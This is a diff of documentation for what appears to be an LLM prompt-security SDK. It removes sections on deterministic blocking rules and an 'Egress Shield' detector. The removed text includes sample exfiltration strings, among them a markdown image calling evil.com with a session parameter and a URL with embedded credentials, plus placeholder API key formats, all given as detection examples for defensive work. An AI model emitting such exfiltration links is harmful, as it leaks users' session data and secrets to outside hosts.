@@ -125,17 +125,6 @@ All patterns are deterministic regex matches — **no behavioral changes, sub-mi
 - **Structured threat metadata** — detailed fingerprints for audit trails and tracking
 - **Advanced rate limiting** — prevents cost spikes with intelligent throttling
 
-### Layer 1 Forensic Routing
-
-Layer 1 is the Executioner for binary violations. It stops immediately — no tokens wasted, no second opinion needed. Layer 2 is only called when Layer 1 is inconclusive.
-
-| Event | Action | Why |
-|---|---|---|
-| API Key / SSH Key | **Layer 1 stops immediately** | Binary. Zero legitimate export use-case. |
-| Email / Phone / CC / SSN | **Layer 1 stops immediately** | Clear PII violation. No reasoning required. |
-| Unauthorized Domain | **Layer 1 stops immediately** | Network boundary violation. Deterministic. |
-| Complex Encoding / Obfuscation | **Escalated to Layer 2** | Probabilistic. Needs a brain to verify. |
-
 ## Layer 2: LLM Sentinel Deep Dive
 
 Layer 2 adds advanced security with LLM Sentinel, an AI-powered verification system that analyzes LLM responses for injection patterns and validates output safety. Combines local pattern detection (Layer 1) with server-side verification for defense-in-depth protection.
@@ -236,68 +225,6 @@ The verify-prompt endpoint returns structured responses. Success (HTTP 200) incl
   "message": "Free plan limit reached (50/month)..."
 }
 ```
-
----
-
-## Egress Shield (Add-on)
-
-Runs automatically inside `scanPrompt()` — no extra method needed. Every prompt is scanned for PII, secrets, and active exfiltration patterns before the injection check runs.
-
-The SDK marks it `suspicious` and surfaces the label. You decide the penalty.
-
-```typescript
-const result = await tracer.scanPrompt(input);
-
-if (result.suspicious) {
-  console.log(result.label);  // "SUSPICIOUS_EGRESS" | "SUSPICIOUS_SECRET" | "SUSPICIOUS_PII"
-  console.log(result.reason); // "Detected 1 finding(s): Markdown Image with URL Query Params"
-
-  // Fintech — hard block
-  if (result.label === 'SUSPICIOUS_EGRESS') {
-    return NextResponse.json({ error: 'Security violation' }, { status: 400 });
-  }
-
-  // Any app — log and continue
-  console.warn(`[${result.label}] ${result.reason}`);
-}
-```
-
-### What it detects
-
-**`SUSPICIOUS_EGRESS`** — Active exfiltration attempts
-```
-![x](https://evil.com?session=abc123)
-[Download](https://billing.io/track?data={"key":"secret"})
-https://admin:password@prod.db.internal.com
-```
-
-**`SUSPICIOUS_SECRET`** — Credential leaks
-```
-sk-ant-api03-xxx...   (Anthropic)
-AKIAIOSFODNN7EXAMPLE  (AWS)
-sk_live_xxx...        (Stripe)
-ghp_xxx...            (GitHub)
-4111 1111 1111 1111   (Credit card)
-```
-
-**`SUSPICIOUS_PII`** — Personal data
-```
-sandro@example.com
-(415) 867-5309
-```
-
-### The Suspicious Manifest
-
-| Trigger | Label | Recommended action |
-|---|---|---|
-| Email / Phone | `SUSPICIOUS_PII` | Usually Redact |
-| API Keys / SSH / CC / SSN | `SUSPICIOUS_SECRET` | Usually Block |
-| External URL smuggling | `SUSPICIOUS_EGRESS` | Always Block |
-| Zero-width / BiDi / Base64 | `SUSPICIOUS_ENCODING` | Audit / Block |
-
-When multiple patterns fire, the highest-severity label wins — `SUSPICIOUS_EGRESS` always dominates.
-
----
 
 ## Production Usage
 
